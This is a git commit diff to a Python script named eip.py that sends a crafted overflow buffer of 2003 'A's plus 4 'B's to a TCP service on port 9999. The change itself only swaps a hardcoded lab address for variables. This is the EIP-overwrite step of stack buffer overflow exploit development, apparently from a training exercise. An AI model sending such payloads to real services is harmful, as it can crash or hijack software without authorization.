d81a6bdffa52b4e961d68bd463e5d2df19ebb536
zer0sense <kalifornia909@gmail.com>
2021-07-11 13:43:36 +0900

    eip

--- eip.py
+++ eip.py
@@ -8,7 +8,7 @@ shellcode = "A" * 2003 + "B" * 4
 
 try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(('192.168.122.126',9999))
+        s.connect((ip,port))
         s.send((command + shellcode))
         s.close()
 
